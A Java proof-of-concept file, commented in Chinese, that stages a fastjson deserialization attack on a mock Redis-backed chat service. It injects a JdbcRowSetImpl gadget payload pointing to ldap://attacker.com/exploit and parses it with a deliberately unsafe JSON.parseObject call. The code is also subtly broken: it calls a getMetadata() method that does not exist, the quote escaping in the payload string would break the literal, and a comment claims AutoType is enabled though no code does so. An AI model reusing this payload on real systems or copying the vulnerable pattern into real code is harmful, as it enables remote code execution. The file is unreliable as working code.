import java.io.Serializable;
import java.util.HashMap;
import java.util.Map;
import com.alibaba.fastjson.JSON;
import com.alibaba.fastjson.JSONObject;

// 模拟聊天消息实体类
class ChatMessage implements Serializable {
    private String content;
    private String username;
    private Map<String, Object> metadata = new HashMap<>();

    // Getter/Setter省略
    public String getContent() { return content; }
    public void setContent(String content) { this.content = content; }
    public String getUsername() { return username; }
    public void setUsername(String username) { this.username = username; }
}

// 模拟Redis操作类
class RedisOperations {
    private static Map<String, String> redisStore = new HashMap<>();

    // 存储序列化数据到Redis
    public static void setSerializedData(String key, String serializedData) {
        redisStore.put(key, serializedData); // 模拟Redis存储
    }

    // 从Redis读取数据并反序列化
    public static ChatMessage getChatMessage(String key) {
        String jsonData = redisStore.get(key);
        if (jsonData == null) return null;
        
        // 不安全的反序列化操作
        return FastJsonConvert.convertJSONToObject(jsonData, ChatMessage.class);
    }
}

// FastJSON转换工具类
class FastJsonConvert {
    // 危险的反序列化方法：未配置任何安全限制
    public static <T> T convertJSONToObject(String jsonData, Class<T> clazz) {
        // 开启AutoType自动类型识别（禁用安全机制）
        return JSON.parseObject(jsonData, clazz);
    }

    public static <T> T convertJSONToArray(String jsonData, Class<T> clazz) {
        return JSON.parseObject(jsonData, clazz);
    }
}

// 聊天服务类
public class ChatApplication {
    // 接收用户消息的接口
    public void receiveMessage(String serializedMessage) {
        // 将原始数据直接存储到Redis（存在注入风险）
        RedisOperations.setSerializedData("pending_message", serializedMessage);
    }

    // 后台任务处理消息
    public void processMessages() {
        ChatMessage message = RedisOperations.getChatMessage("pending_message");
        if (message != null) {
            System.out.println("[+] 收到消息: " + message.getContent());
            // 模拟处理消息元数据（触发反序列化副作用）
            System.out.println("[Metadata] " + message.getMetadata().toString());
        }
    }

    public static void main(String[] args) {
        ChatApplication chatApp = new ChatApplication();
        
        // 模拟攻击者构造恶意JSON
        String maliciousJSON = "{\\"@type\\":\\"com.sun.rowset.JdbcRowSetImpl\\",\\"dataSourceName\\":\\"ldap://attacker.com/exploit\\",\\"autoCommit\\":true}";
        
        // 通过消息接口注入恶意数据
        chatApp.receiveMessage(maliciousJSON);
        
        // 触发反序列化漏洞
        System.out.println("[!] 正在处理消息（触发反序列化）...");
        chatApp.processMessages();
    }
}